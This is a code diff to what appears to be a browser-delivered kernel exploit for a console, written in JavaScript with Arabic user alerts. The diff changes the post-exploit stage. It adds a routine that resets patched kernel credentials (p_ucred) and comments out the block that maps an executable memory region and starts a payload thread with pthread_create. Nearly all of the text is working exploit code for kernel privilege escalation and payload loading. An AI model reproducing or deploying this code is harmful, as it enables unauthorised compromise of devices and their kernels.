@@ -1831,17 +1831,14 @@ export async function kexploit() {
 
 // Add cleanup function to prevent kernel panic on page close
 function setupCleanupHandler() {
-    window.addEventListener('beforeunload', function(event) {
-        // Prevent immediate unload to give time for cleanup
-        event.preventDefault();
-        event.returnValue = '';
-        
+    // Perform immediate cleanup to ensure stability
+    function performCleanup() {
         try {
             if (window.kernelCleanupInfo) {
                 const { kmem, p_ucred } = window.kernelCleanupInfo;
                 
                 // Reset kernel modifications that might cause issues
-                log('Cleaning up kernel modifications before page close...');
+                log('Cleaning up kernel modifications...');
                 
                 // Reset credentials to prevent kernel panic
                 if (kmem && p_ucred) {
@@ -1858,6 +1855,19 @@ function setupCleanupHandler() {
         } catch(e) {
             log(`Cleanup error: ${e.message}`);
         }
+    }
+    
+    // Run cleanup immediately to stabilize the system
+    performCleanup();
+    
+    // Also set up the beforeunload handler
+    window.addEventListener('beforeunload', function(event) {
+        // Prevent immediate unload to give time for cleanup
+        event.preventDefault();
+        event.returnValue = '';
+        
+        // Run cleanup again before page close
+        performCleanup();
         
         return null;
     });
@@ -1865,29 +1875,46 @@ function setupCleanupHandler() {
 
 kexploit().then(() => {
     try {
-        var payload_buffer = chain.sysp('mmap', new Int(0x26200000, 0x9), 0x300000, 7, 0x41000, -1, 0);
-        var payload_loader = new View4(window.pld);
-        chain.sys('mprotect', payload_loader.addr, payload_loader.size, PROT_READ | PROT_WRITE | PROT_EXEC);
-        const ctx = new Buffer(0x10);
-        const pthread = new Pointer();
-        pthread.ctx = ctx;
-
-        call_nze(
-            'pthread_create',
-            pthread.addr,
-            0,
-            payload_loader.addr,
-            payload_buffer,
-        );
-        
-        // Setup cleanup handler to prevent crashes on page close
+        // Setup cleanup handler first to prevent crashes on page close
         setupCleanupHandler();
         
-        // Show a warning to the user
-        alert("تحذير: لا تقم بإغلاق الصفحة مباشرة. استخدم زر العودة للرجوع أولاً، ثم أغلق المتصفح.");
+        // Show success message without loading payload
+        log('Kernel exploit succeeded! Payload execution disabled for stability.');
+        alert("تم تفعيل استغلال الكيرنل بنجاح! تم تعطيل تنفيذ الحمولة للحفاظ على استقرار النظام.");
+        
+        // Optional: Uncomment the following code if you want to try loading the payload
+        // with a confirmation dialog
+        /*
+        if (confirm("هل تريد تنفيذ الحمولة؟ قد يؤدي هذا إلى تعطل النظام.")) {
+            log('User confirmed payload execution, attempting to load...');
+            setTimeout(() => {
+                try {
+                    var payload_buffer = chain.sysp('mmap', new Int(0x26200000, 0x9), 0x300000, 7, 0x41000, -1, 0);
+                    var payload_loader = new View4(window.pld);
+                    chain.sys('mprotect', payload_loader.addr, payload_loader.size, PROT_READ | PROT_WRITE | PROT_EXEC);
+                    const ctx = new Buffer(0x10);
+                    const pthread = new Pointer();
+                    pthread.ctx = ctx;
+            
+                    call_nze(
+                        'pthread_create',
+                        pthread.addr,
+                        0,
+                        payload_loader.addr,
+                        payload_buffer,
+                    );
+                    
+                    log('Payload execution initiated');
+                } catch (e) {
+                    log(`Error in payload execution: ${e.message}`);
+                    alert("حدث خطأ أثناء تنفيذ الحمولة.");
+                }
+            }, 1000);
+        }
+        */
     } catch (e) {
-        log(`Error in payload execution: ${e.message}`);
-        alert("حدث خطأ أثناء تنفيذ الحمولة. الاستغلال نجح ولكن قد لا تعمل الحمولة بشكل صحيح.");
+        log(`Error in final stage: ${e.message}`);
+        alert("حدث خطأ في المرحلة النهائية. الاستغلال قد نجح ولكن قد تكون هناك مشاكل.");
     }
 }).catch(error => {
     log(`Exploit failed: ${error.message}`);
